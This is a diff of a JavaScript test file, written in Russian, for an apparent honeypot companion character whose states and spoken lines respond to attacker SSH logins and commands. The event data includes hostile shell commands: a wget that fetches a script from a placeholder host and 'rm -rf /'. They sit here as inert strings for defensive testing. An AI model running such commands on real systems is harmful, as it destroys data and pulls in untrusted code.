@@ -60,7 +60,7 @@ describe('реакции Юми (раздел 9)', () => {
     bridge.handle('attack:auth', { ip: '192.0.2.23', username: 'root', success: true });
     bridge.handle('attack:command', { ip: '192.0.2.23', command: 'wget http://x/y.sh' });
     bridge.handle('token:triggered', { ip: '203.0.113.9' });
-    expect(log.states).toEqual(['curious', 'analyzing', 'excited', 'analyzing', 'error']);
+    expect(log.states).toEqual(['curious', 'searching', 'excited', 'analyzing', 'victory_demo']);
     expect(log.said).toEqual([
       'Новое подключение с 192.0.2.23 по ssh.',
       '192.0.2.23 пробует войти как root.',
@@ -78,6 +78,24 @@ describe('реакции Юми (раздел 9)', () => {
     expect(said.startsWith('192.0.2.23 выполняет: rm -rf / ')).toBe(true);
     expect(said.endsWith('…')).toBe(true);
     expect(said.length).toBeLessThan(120);
+  });
+
+  it('акценты: перебор, первый прорыв (радость 67-2), опасная команда, чередование состояний', () => {
+    const { bridge, log } = setup();
+    bridge.handle('attack:auth', { ip: '192.0.2.5', username: 'root', success: false, repeat: 5 });
+    bridge.handle('attack:auth', { ip: '192.0.2.5', username: 'admin', success: true, first: true });
+    bridge.handle('attack:command', { ip: '192.0.2.5', command: 'rm -rf /', danger: true });
+    bridge.handle('attack:connect', { ip: '192.0.2.5', protocol: 'ssh', repeat: 7 });
+    bridge.handle('attack:command', { ip: '192.0.2.5', command: 'ls', variant: 1 });
+    // Разные клипы: Sad, танец радости, Sad, Look Around, Look Around(comparing).
+    expect(log.states).toEqual(['error', '67-2', 'error', 'searching', 'comparing']);
+    expect(log.said).toEqual([
+      'Перебор паролей с 192.0.2.5 — уже 5 попыток.',
+      'Прорыв! 192.0.2.5 вошёл как admin — ловушка сработала, пошла живая сессия!',
+      'Опасная команда с 192.0.2.5: rm -rf /',
+      'Шквал подключений с 192.0.2.5 — уже 7.',
+      '192.0.2.5 запускает: ls',
+    ]);
   });
 
   it('мусор в payload не роняет реакцию; неизвестное событие игнорируется', () => {
